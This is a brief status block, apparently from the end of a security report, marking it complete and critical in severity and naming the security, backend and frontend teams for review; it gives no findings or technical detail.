**Report Status:** ✅ COMPLETE  
**Requires Action:** YES  
**Severity:** CRITICAL  
**Recommended Review:** Security Team, Backend Team, Frontend Team
